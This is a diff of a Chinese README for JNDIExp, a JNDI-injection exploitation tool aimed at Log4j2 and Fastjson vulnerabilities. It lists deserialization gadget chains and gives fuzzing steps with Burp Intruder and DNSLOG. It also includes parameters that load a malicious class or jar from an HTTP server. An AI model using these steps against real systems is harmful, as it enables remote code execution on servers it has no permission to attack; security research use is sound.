@@ -1,5 +1,3 @@
-# JNDIEXP
-
 # JNDIExp使用说明
 
 用于 JNDI注入 利用的工具，参考/引用了 **Rogue JNDI** /**JNDIExploit**项目的代码。
@@ -7,10 +5,11 @@
 ## **免责说明**
 
 本工具仅适用于安全研究，严禁适用本工具发起网络黑客攻击，造成法律后果，请使用者自负。
+
 - - - -
 
-## **使用说明**
 
+## **使用说明**
 - - - -
 ```java
 Usage: java -jar JNDIInject-1.0-SNAPSHOT.jar [options]
@@ -171,7 +170,8 @@ Supported LADP Queries：
       commons_dbcp2_RCE
       druidjdbc
       tomcatjdbc
-      Vaadin1
+      Vaadin1 
+      CommonBeanutilsNoCC
     ----------------------------------------------------------------------------------------->
     [-] Fuzz Payload that can be used: 
       EL
@@ -204,10 +204,12 @@ Supported LADP Queries：
 本模块利用tomcat中的`org.apache.naming.factory.BeanFactory`和JDK自带的MLET类进行fuzz。
 
 **缺点：**
+
 1. 需要依赖tomcat的ObjectFactory类(org.apache.naming.factory.BeanFactory
 2. 需要配合burpsutite的intruder模块
 3. 配合http平台接收请求(推荐ceye)(使用`python3 -m http.server port`简易http接受请求)
 下列为Fuzz使用的字典。
+4. **使用tomcat时由于使用的ParallelWebappClassLoader加载第三方lib，所以MLET加载class会报错，故无法使用此模块进行爆破**（后续考虑删除此模块）
 ```
 EL
 BeanShell2
@@ -234,6 +236,7 @@ MozillaRhino1
 Rome
 ```
 **使用步骤：**
+
 1. 利用DNSLOG发现log4j2漏洞或者Fastjson类能够发起ldap请求的漏洞。
 2. 开启本工具进行监听
 3. 利用字典替换fuzz后面的字段，进行爆破
@@ -285,6 +288,7 @@ commons_dbcp2_RCE
 druidjdbc
 tomcatjdbc
 Vaadin1
+CommonBeanutilsNoCC
 ```
 
 
@@ -345,6 +349,7 @@ commons_dbcp2_RCE
 druidjdbc
 tomcatjdbc
 Vaadin1
+CommonBeanutilsNoCC
 ```
 可使用的利用方式
 ```
@@ -367,10 +372,27 @@ snakeyaml ：  `command=http://127.0.0.1:8080/exp.jar 加载恶意类`。可以�
 
 C3p0 ：`command=http://127.0.0.1:8080:Exploit(端口为默认为8080)`  data目录下的Exploit可以进行参考,直接修改Exploit.java的命令使用javac编译(不用另外起http服务)
 
+## Fuzz案例：
+
+发现Log4j2漏洞或者fastjson漏洞后，使用burp的intruder模块进行fuzz(简单直接)
+
+## ![FuzzExample1](./images/FuzzExample1.png) 
+
+添加Fuzz2的字典。（可以设置一下发包间隔1s）
+
+![FuzzExample2](./images/FuzzExample2.png)
+
+去DNS平台查询结果
+
+![FuzzExample3](./images/FuzzExample3.png)
+
+
+
+
 
 
 # 总结
 
-
+能用就行
 
 ![](./images/nyjx.png)
